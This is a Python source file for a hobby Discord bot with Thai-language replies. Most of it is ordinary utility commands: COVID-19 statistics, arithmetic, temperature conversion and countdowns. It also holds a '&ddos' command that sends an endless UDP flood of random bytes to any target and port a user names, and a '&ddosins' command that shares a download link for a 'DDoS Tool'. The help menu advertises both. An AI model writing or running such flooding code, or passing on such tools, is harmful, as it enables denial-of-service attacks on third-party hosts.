import discord
from discord.ext import commands
import datetime
import urllib.parse, urllib.request, re
import requests
from time import sleep
import math
import socket
import os
import serial
import dht11test


intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='%', description="พูดมากว่ะ", intents=intents)
bot.remove_command('help')


# COVID COMMAND
stat_url = "https://covid19.th-stat.com/api/open/"

emo = {
	"blank" : '<:pai__blank:775679312619634698>',
	"up_red" : '<:pai__up_red:775694925941047316>',
	"up_green" : '<:pai__up_green:775694925924794368>',
	"down_red" : '<:pai__down_red:775694925748633651>',
	"down_green" : '<:pai__down_green:775694925844840479>'
}

async def covid_stat(ctx, minimal=False) :
	response = requests.get(stat_url + "today")
	data = response.json()
	datestr = data["UpdateDate"]
	dataformat = {
		"Confirmed" : ('mask', False),
		"Deaths" : ('skull', False),
		"Recovered" : ('sparkling_heart', True),
		"Hospitalized" : ('hospital', False)
	}

	blank_emoji = emo["blank"]
	def digits_gen(number, max_length, symbol=False, positive=True) :
		numstr = ("zero", "one", "two", "three", "four", "five", "six", "seven", "eight", "nine")
		if symbol :
			resstr = emo[((("up_green" if number > 0 else "down_red") if positive else ("up_red" if number > 0 else "down_green"))) if number != 0 else "blank"]
		else :	
			resstr = ""
		number = str(abs(number))
		if len(number) < max_length :
			resstr += blank_emoji * (max_length - len(number))
		for c in number :
			resstr += ':{}:'.format(numstr[int(c)])
		return resstr

	tempstr = ":{}:{}{}"
	await ctx.send("รายงานสถานการณ์ COVID-19 ในประเทศไทย\n" + datestr)
	final = [tempstr.format(dataformat[topic][0], blank_emoji + digits_gen(data[topic], max([len(str(abs(data[c]))) for c in list(dataformat.keys())])) + blank_emoji, digits_gen(data["New"+topic], max([len(str(abs(data["New"+c]))) for c in list(dataformat.keys())]), True, dataformat[topic][1])) for topic in list(dataformat.keys())]
	if minimal :
		await ctx.send("\n".join(final))
	else :
		for f in final :
			await ctx.send(f)

# Command
@bot.command()
async def welcome(ctx):
	welcome = discord.Embed(title = "**ยินดีต้อนรับสู่ GGWP'Games Room !**", description = "ขอให้โชคดี 😀", color = 0x00FF00)
	welcome.set_thumbnail(url="https://cdn.discordapp.com/attachments/778868879567880192/779671284786528276/Stonk.gif")
	await ctx.send(embed = welcome)

@bot.command()
async def congrat(ctx):
	congrat = discord.Embed(title = "**CONGRATULATION!!**", description = "ยินดีด้วย!! 🎉🎉", color = 0x00FF00)
	congrat.set_thumbnail(url="https://cdn.discordapp.com/attachments/778868879567880192/780126909421846548/Congrat.gif")
	await ctx.send(embed = congrat)


# OS
@bot.command()
async def shutdown(ctx):
	print("Shutting down...")
	await ctx.send("❌ Shutting down...")
	ctx.bot.logout()

@bot.command()
async def restart(ctx):
	print("Restarting...")
	await ctx.send("♻️ Restarting...")
	os.system('RunBot.py')


# Math
@bot.command()
async def sum(ctx, numOne: float, numTwo: float):
	sum = numOne + numTwo
	await ctx.send(f"{numOne} + {numTwo} = {sum}")

@bot.command()
async def dif(ctx, numOne: float, numTwo: float):
	dif = numOne - numTwo
	await ctx.send(f"{numOne} - {numTwo} = {dif}")

@bot.command()
async def mul(ctx, numOne: float, numTwo: float):
	try :
		mul = numOne * numTwo
	except OverflowError :
		await ctx.send("ทำไม่ได้โว้ย !!")
		return
	await ctx.send(f"{numOne} × {numTwo} = {mul}")

@bot.command()
async def div(ctx, numOne: float, numTwo: float):
	try :
		div = numOne / numTwo
	except ZeroDivisionError :
		await ctx.send("ผิดหลักคณิตศาสตร์ !!")
		return
	await ctx.send(f"{numOne} ÷ {numTwo} = {div}")	

@bot.command()
async def pow(ctx, numOne: float, numTwo: float):
	try :
		pow = numOne ** numTwo
	except OverflowError :
		await ctx.send("เยอะไปไอ้เบื๊อก !!")
		return
	await ctx.send(f"{numOne} ^ {numTwo} = {pow}")

@bot.command()
async def sqrt(ctx, sqrtnum: float, number: int):
	sqrt = number**(1/sqrtnum)
	await ctx.send(f"รากที่ {sqrtnum} ของ {number} = {sqrt}")

@bot.command()
async def fac(ctx, number: int):
	fac = math.factorial(number)
	await ctx.send(f"{number}! = {fac}")

@bot.command()
async def update(ctx):
	u = discord.Embed(title = "📌 **Update**", color = 0x00FF00)
	u.add_field(name="1️⃣ V.1.0.0 | 16/12/2020", value="`• Status: Online 24/7\n• Delete: &shutdown\n• Delete: &restart\n• Delete: &pyramid\n• Delete: &yt\n• Delete: &ddos\n• Delete: &square\n• Delete: &dht11`")
	u.add_field(name="2️⃣ V.1.1.0 | 22/12/2020", value="`• Delete: &dht11 in &help\n• Delete: on_member_join\n• Add: &update\n• Add: Embed for &covid\n• Add: Limit of &fac\n• Fix: &sqrt\n• Fix: Loop หวัดดี,สวัสดี`")
	u.add_field(name="3️⃣ V.1.1.1 | 25/12/2020", value="`• Delete: Some auto detection word`")
	await ctx.send(embed = u)

@bot.command()
async def help(ctx):
	h = discord.Embed(title = "❔ **Help**", color = 0x00FF00)
	h.add_field(name="ℹ️ ข้อมูลกลุ่ม", value="`&guild`")
	h.add_field(name="🙏 ข้อความต้อนรับ", value="`&welcome`")
	h.add_field(name="🎉 ข้อความยินดี", value="`&congrat`")
	h.add_field(name="📩 เชิญบอท", value="`&invite`")
	h.add_field(name="⚙️ คำนวณเลข", value="`&help_math`")
	h.add_field(name="⏲️ เคานต์ดาวน์", value="`&countdown [เวลา]`")
	h.add_field(name="🔺 สร้างพีระมิด [ERROR]", value="`&pyramid [จำนวนชั้น]`")
	h.add_field(name="📐 สร้างสามเหลี่ยมมุมฉาก", value="`&right_triangle [จำนวนชั้น]`")
	h.add_field(name="🔄 แปลงหน่วยอุณหภูมิ", value="`&help_temp`")
	h.add_field(name="😷 ตรวจสอบสถานการณ์ไวรัส COVID-19", value="`&covid`")
	h.add_field(name="🌡 ตรวจสอบอุณหภูมิและความชื้น", value="`&dht11`")
	h.add_field(name="🔄 แปลงเปอร์เซ็นต์และตัวเลข", value="`&help_percent`")
	h.add_field(name="▶️ Youtube Search [ERROR]", value="`&yt [ชื่อคลิป]`")
	h.add_field(name="🚀 โปรแกรมยิงไอพี DDoS Tool", value="`&ddosins`")
	h.add_field(name="📡 ยิงไอพี", value="`&ddos [Target] [Port]`")
	h.add_field(name="❌ ปิดการทำงานบอท", value="`&shutdown`")
	h.add_field(name="♻ รีบูตการทำงานบอท", value="`&restart`")
	await ctx.send(embed = h)

@bot.command()
async def help_math(ctx):
	hm = discord.Embed(title = "⚙️ **คำนวณเลข**", color = 0x00FF00)
	hm.add_field(name="`➕` บวก", value="`&sum [Num 1] [Num 2]`")
	hm.add_field(name="`➖` ลบ", value="`&dif [Num 1] [Num ]`")
	hm.add_field(name="`✖️` คูณ", value="`&mul [Num 1] [Num 2]`")
	hm.add_field(name="`➗` หาร", value="`&div [Num 1] [Num 2]`")
	hm.add_field(name="💪 ยกกำลัง", value="`&pow [Num 1] [Num 2]`")
	hm.add_field(name="`√` ถอดราก", value="`&sqrt [Number] [Sqrt Num]`")
	hm.add_field(name="`!` แฟกทอเรียล", value="`&fac [Number]`")
	await ctx.send(embed = hm)

@bot.command()
async def help_temp(ctx):
	ht = discord.Embed(title = "🔄 **แปลงหน่วยอุณหภูมิ**", color = 0x00FF00)
	ht.add_field(name="°C เป็น °F", value="`&ctf [Temp °C]`")
	ht.add_field(name="°F เป็น °C ", value="`&ftc [Temp °F]`")
	ht.add_field(name="°C เป็น K", value="`&ctk [Temp °C]`")
	ht.add_field(name="K เป็น °C", value="`&ktc [Temp K]`")
	ht.add_field(name="°F เป็น K", value="`&ftk [Temp °F]`")
	ht.add_field(name="K เป็น °F", value="`&ktf [Temp K]`")
	await ctx.send(embed = ht)

@bot.command()
async def help_percent(ctx):
	pn = discord.Embed(title = "🔄 **แปลงเปอร์เซ็นต์และตัวเลข**", color = 0x00FF00)
	pn.add_field(name="เปอร์เซ็นต์เป็นตัวเลข", value="`&ptn [%] [Total]`")
	pn.add_field(name="ตัวเลขเป็นเปอร์เซ็นต์", value="`&ntp [Number] [Total]`")
	await ctx.send(embed = pn)

@bot.command()
async def guild(ctx):
	print(ctx.guild.owner)
	print(ctx.guild.owner.mention)
	embed = discord.Embed(title=f"{ctx.guild.name}", timestamp=datetime.datetime.utcnow(), color=discord.Color.green())
	embed.add_field(name="สร้างเมื่อ", value=f"`{ctx.guild.created_at}`")
	embed.add_field(name="เจ้าของ", value=f"{ctx.guild.owner.mention}")
	embed.add_field(name="ภูมิภาค", value=f"`{ctx.guild.region}`")
	embed.add_field(name="ไอดีของเซิฟเวอร์", value=f"`{ctx.guild.id}`")
	embed.add_field(name="ข้อจำกัด", value=f"`อีโมจิ : {ctx.guild.emoji_limit}\nบิตเรท : {ctx.guild.bitrate_limit}\nขนาดไฟล์ : {ctx.guild.filesize_limit}`")
	# embed.set_thumbnail(url=f"{ctx.guild.icon}")
	embed.set_thumbnail(url=f"{ctx.guild.icon_url}")

	await ctx.send(embed=embed)

@bot.command()
async def yt(ctx, *, search):

	query_string = urllib.parse.urlencode({
		'search_query': search
	})
	htm_content = urllib.request.urlopen(
		'http://www.youtube.com/results?' + query_string
	)
	# print(html_content.read().decode())
	search_results = re.findall('href=\"\\/watch\\?v=(.{11})', htm_content.read().decode())
	# I will put just the first result, you can loop the response to show more results
	await ctx.send('http://www.youtube.com/watch?v=' + search_results[0])


# Temp
@bot.command()
async def ctf(ctx, tempc: float):
	await ctx.send(str(((9*tempc)/5)+32) + ' °F')

@bot.command()
async def ftc(ctx, tempf: float):
	await ctx.send(str(((tempf-32)/9)*5) + ' °C')

@bot.command()
async def ctk(ctx, tempc: float):
	await ctx.send(str(tempc+273) + ' K')

@bot.command()
async def ktc(ctx, tempk: float):
	await ctx.send(str(tempk-273) + ' °C')

@bot.command()
async def ftk(ctx, tempf: float):
	await ctx.send(str(((5*(tempf-32))/9)+273) + ' K')

@bot.command()
async def ktf(ctx, tempk: float):
	await ctx.send(str((((tempk-273)*9)/5)+32) + ' °F')


@bot.command()
async def covid(ctx) :
	is_on_mobile = getattr(ctx.message.author, "is_on_mobile", None)
	if callable(is_on_mobile) :
		await covid_stat(ctx, is_on_mobile())
		return
	else :
		await covid_stat(ctx)

@bot.command()
async def pyramid(ctx, size: int):
	noname1 = ""
	space = size - 1
	for a in range(0, size):
		for s in range(0, space):
			noname1 += "\n"
		space -= 1
		for x in range(0, a+1):
			if x == a:
				noname1 += "\*"
			else:
				noname1 += "\*\*"
		await ctx.send(noname1)

@bot.command()
async def right_triangle(ctx, size: int):
	result = ""
	for i in range(size):
		result += "\*"*(i+1) + "\n"
	await ctx.send(result)

@bot.command()
async def square(ctx, size: int):
	for y in range(size) :
		if y == 0 or y == size-1 :
			await ctx.send("#"*size)
		else :
			await ctx.send("#",end="")
			await ctx.send(" "*(size-2), end="")
			await ctx.send("#")


# Percent
@bot.command()
async def ptn(ctx, percent: float, total: float):
	ptn_result = (percent/100)*total
	await ctx.send(f'{percent}% of {total} = {ptn_result}')

@bot.command()
async def ntp(ctx, number:float, total:float):
	ntp_result = (number/total)*100
	await ctx.send(f'{number} of {total} = {ntp_result}%')

@bot.command()
async def ddosins(ctx):
	ddos = discord.Embed(title = "🚀 **DDoS Tool V1.0**", color = 0x00FF00)
	ddos.description ="[DOWNLOAD](https://drive.google.com/u/0/uc?export=download&confirm=Qu7_&id=1McyRQuqqqsDYstMCSP2gzCKn7cHt8jgx)"
	ddos.set_thumbnail(url="https://cdn.discordapp.com/attachments/778868879567880192/781516216987680788/DDoS_LOGO.jpg")
	await ctx.send(embed = ddos)

@bot.command()
async def send(ctx, id, *, text):
	if 269000561255383040 == ctx.message.author.id :
		channel = ctx.bot.get_channel(int(id))
		await channel.send(text)

@bot.command()
async def invite(ctx):
	invite = discord.Embed(title = "📩 **เชิญบอท**", color = 0x00FF00)
	invite.description ="[Click Here](https://discord.com/oauth2/authorize?client_id=778302031042576395&permissions=247872&scope=bot)"
	await ctx.send(embed = invite)

# Countdown
@bot.command()
async def countdown(ctx, time: int):
	if time > 100 :
		await ctx.send("หากคุณต้องการนับถอยหลังมากกว่า 100 วินาที โปรดใช้ `&forcecountdown`")
	else :
		while time > 1:
			time = time - 1
			await ctx.send(f"Time remaining: {time} seconds")
			sleep(1)

@bot.command()			
async def forcecountdown(ctx, time:int):
	while time > 1:
			time = time - 1
			await ctx.send(f"Time remaining: {time} seconds")
			sleep(1)	

@bot.listen()
async def on_message(message):
	if " 1 seconds" in message.content.lower():
		if message.author.id == bot.user.id:
			await message.channel.send('Time Up !!')

@bot.command()			
async def dht11(ctx):
	await ctx.send(dht11test.dht11_out())

@bot.command()
async def ddos(ctx, target:str, port:int):
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	
		byte = os.urandom(10240)

		sent = 1

		while True:
			out = ""
			s.sendto(byte, (target, port))
			out += f"Sending {sent} To {target} with port {port}"
			sent = sent + 13466

			await ctx.send(out)
			sleep(5)

# Events
@bot.event
async def on_ready():
	await bot.change_presence(activity=discord.Game(name="⚙️ Running"))
	print('Started!')


@bot.event
async def on_member_join(message):
	await message.channel.send(f'Welcome {member.name} to {guild.name}')
	await bot.process_commands(message)


# Listen
async def on_command(ctx):
	ch = ctx.bot.get_channel(782287323261304853)
	await ch.send("test")

@bot.listen()
async def on_message(message):
	if "fuck" in message.content.lower():
		await message.channel.send('Hey!')

	elif "สวัสดี" in message.content.lower():
		if message.author.id == bot.user.id:
			return
		if message.author.id == 778302031042576395:
			return
		await message.channel.send('สวัสดี 🙏😀')

	elif "หวัดดี" in message.content.lower():
		if message.author.id == bot.user.id:
			return
		if message.author.id == 778302031042576395:
			return
		await message.channel.send('หวัดดี 🙏😀')

	elif "okay" in message.content.lower():
		await message.channel.send('hmmmmmm🤔')

	elif "shut up" in message.content.lower():
		await message.channel.send("👌 if you did't say it again")

	elif "เห้ย" in message.content.lower():
		await message.channel.send('ไรหยอ 🤨')

	elif "wtf" in message.content.lower():
		await message.channel.send('...')

	elif "rip" in message.content.lower():
		await message.channel.send('F')

	elif "ยินดีด้วย" in message.content.lower():
		await message.channel.send('ขอแสดงความยินดี! 🎉🎉')

	elif "congratulation" in message.content.lower():
		if message.author.id == bot.user.id:
			return
		await message.channel.send('CONGRATULATION! 🎉🎉')
		await bot.process_commands(message)


Token = os.getenv("DaFuqTestToken")
bot.run(Token)